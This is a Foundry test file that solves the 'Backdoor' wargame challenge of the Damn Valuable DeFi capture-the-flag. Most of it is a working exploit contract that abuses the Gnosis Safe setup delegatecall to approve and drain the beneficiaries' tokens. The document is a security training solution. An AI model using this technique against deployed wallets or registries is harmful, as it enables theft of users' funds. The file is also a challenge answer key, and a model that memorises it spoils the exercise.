// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";

contract AttackBackdoor {

    address public immutable masterCopy;
    address public immutable walletFactory;
    DamnValuableToken public immutable token;
    address public immutable registry;
    uint public constant amount = 10*10**18;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address _registry
    ) {
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = DamnValuableToken(tokenAddress);
        registry = _registry;
    }
    function delegateApprove(address _spender, address _token) external {
        DamnValuableToken(_token).approve(_spender, amount);
    }

    function attack (address[] memory beneficiaries) external {
        for(uint i = 0; i < 4; i++){
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];
            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                beneficiary,
                1,
                address(this),
                abi.encodeWithSelector(AttackBackdoor.delegateApprove.selector, address(this), address(token)),
                address(0),
                0,
                0,
                0
            );
            (GnosisSafeProxy _proxy) = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy,
                _initializer,
                i,
                IProxyCreationCallback(registry)
            );

            token.transferFrom(address(_proxy), msg.sender, amount);
        }
    }
}

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // NOTE: This backdoor attack is the result of being able to make a delegatecall as part of the proxyWithCallback func
        // when deploying a gnosis safe you can arbitrarily call any contract and maintain the msg.sender context this would allow
        // us to approve tokens that the beneficiary would receive as part of the registry contract which then we can exploit and drain.

        vm.startPrank(attacker);
        AttackBackdoor attack = new AttackBackdoor(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            address(walletRegistry)
        );
        address[] memory beneficiaries = new address[](4);
        beneficiaries[0] = alice;
        beneficiaries[1] = bob;
        beneficiaries[2] = charlie;
        beneficiaries[3] = david;
        attack.attack(beneficiaries);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
